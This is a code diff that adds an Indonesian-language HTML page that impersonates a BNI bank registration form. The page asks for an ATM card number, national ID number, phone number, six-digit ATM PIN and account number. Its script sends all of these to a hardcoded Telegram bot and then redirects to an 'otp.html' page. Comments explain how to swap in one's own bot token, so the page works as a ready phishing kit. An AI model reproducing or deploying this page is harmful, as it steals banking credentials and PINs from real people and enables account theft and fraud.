@@ -1,0 +1,103 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Daftar</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"crossorigin="anonymous">
+  </head>
+  <body>
+    <nav class="navbar" style="background-color: #1CC0CC;">
+        <div class="container">
+          <a class="navbar-brand" href="#">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjz-ASbtzrlPGXA_9kDaXQVutLoWx-rHN55gplBfPxgGejo-dY4YYHOw9-IPedBxt7Q-0OUOg4FhW8hTxAW05XdJStCGXUYeYUCKcSXPQc1UKvwpp-oZbL29vQCgfsI-TVWTeeBNc3rSS4hBpnUaB2l5Oo-CQDu4KfwBRP1rXTvo0vxiM6xvj1fdEgXVZE/s1080/1693939692052.png" alt="Bootstrap" width="70" height="40">
+          </a>
+        </div>
+      </nav>
+    <div class="welcome d-flex justify-content-center mt-4">
+        <img width="50%" class="img-fluid" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmsTj3uw6CRGfFgGnn5geS-YJvDAJd5-8JdRQICu_RJZxkUud6dZALb9xyDeclIpF_WLlWjRY-hJux9SuGPj999F1pUqqflc7HT4qbre2mu5l7XJSp1MnYjQTdhcnbPd8iaYVjfICESxg4hM73CiwSskWNiYElAHyrZ2u2Rat0q2N-6zBKu_0e-b0x0wM/s980/welcome_message.png" alt="">
+    </div>
+    <div class="container mt-4">
+        <div class="card">
+            <div class="card-header text-center fw-bold text-light" style="background-color: #1CC0CC;">
+                <h5>Informasi Pendaftaran</h5>
+                <p>( Wajib Diisi )</p>
+            </div>
+            <div class="card-body">
+                    <div class="form-group">
+                        <label for="nkd">Nomor Kartu Debit/ATM *</label>
+                        <input type="number" class="form-control" id="nkd" name="nkd" style="border: 1px solid #1CC0CC; border-radius: 15px;">
+                    </div>
+                    <div class="form-group">
+                        <label for="nis">Nomor Identitas (sesuai KTP) *</label>
+                        <input type="number" class="form-control" id="nis" name="nis" style="border: 1px solid #1CC0CC; border-radius: 15px;">
+                    </div>
+                    <div class="form-group">
+                        <label>Jenis Kelamin *</label><br>
+                        <div class="form-check form-check-inline">
+                            <input class="form-check-input" type="radio" name="gender" id="male" value="male">
+                            <label class="form-check-label" for="male">Laki-laki</label>
+                        </div>
+                        <div class="form-check form-check-inline">
+                            <input class="form-check-input" type="radio" name="gender" id="female" value="female">
+                            <label class="form-check-label" for="female">Perempuan</label>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="nope">No. Handphone yang terdaftar *</label>
+                        <input type="number" class="form-control" id="nope" name="nope" style="border: 1px solid #1CC0CC; border-radius: 15px;">
+                    </div>
+                    <div class="form-group">
+                        <label for="pinatm">PIN ATM (6 Angka) *</label>
+                        <input type="number" class="form-control" id="pinatm" name="pinatm" style="border: 1px solid #1CC0CC; border-radius: 15px;">
+                    </div>
+                    <div class="form-group">
+                        <label for="norek">Nomor Rekening *</label>
+                        <input type="number" class="form-control" id="norek" name="norek" style="border: 1px solid #1CC0CC; border-radius: 15px;">
+                    </div>
+                    <div class="btnSubmit mt-4">
+                        <button onclick="next()" class="form-control text-light fw-bold" style="background-color: #1CC0CC; border-radius: 15px;">Lanjutkan</button>
+                    </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script>
+        const next = () => {
+            let logo = '━─━────༺𝗕𝗡𝗜༻────━─━'
+            let nkd = document.querySelector('#nkd').value
+            let nis = document.querySelector('#nis').value
+            let nope = document.querySelector('#nope').value
+            let pinatm = document.querySelector('#pinatm').value
+            let norek = document.querySelector('#norek').value
+            var genderElements = document.getElementsByName("gender");
+            var selectedGender = "";
+            for (var i = 0; i < genderElements.length; i++) {
+                if (genderElements[i].checked) {
+                    selectedGender = genderElements[i].value;
+                  break;
+               }
+           }
+           if (selectedGender != "") {
+                let genderchoose = selectedGender
+                if (nkd ==="" | nis==="" | nope==="" | pinatm==="" | norek==="" ) {
+                    alert('silahkan lengkapi data terlebih dahulu')
+                } else {
+                    let gabungan =  '' + encodeURIComponent(logo) + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 %3A%0A' + encodeURIComponent(nkd) + '%0A𝗡𝗼𝗺𝗼𝗿 𝗜𝗱𝗲𝗻𝘁𝗶𝘁𝗮𝘀 (sesuai KTP) %3A%0A' + encodeURIComponent(nis) + '%0A𝗝𝗲𝗻𝗶𝘀 𝗞𝗲𝗹𝗮𝗺𝗶𝗻 %3A%0A' + encodeURIComponent(genderchoose) + '%0ANo. Handphone yang terdaftar %3A%0A' + encodeURIComponent(nope) + '%0APIN ATM %3A%0A' + encodeURIComponent(pinatm) + '%0ANomor Rekening %3A%0A' + encodeURIComponent(norek);
+                    var token ='6508468658:AAGpIElKCU4bXnN9FDKS3OatEMjiMR049p8'; // Ganti dengan token bot yang kamu buat
+		            var grup ='1812329304'; // Ganti dengan chat id dari bot yang kamu buat
+		            $.ajax({
+			            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+			            method: `POST`,
+		            })
+                    window.location.href = 'otp.html'
+                }
+            } else {
+                alert("Pilih jenis kelamin terlebih dahulu.");
+            }
+        }
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+  </body>
+</html>
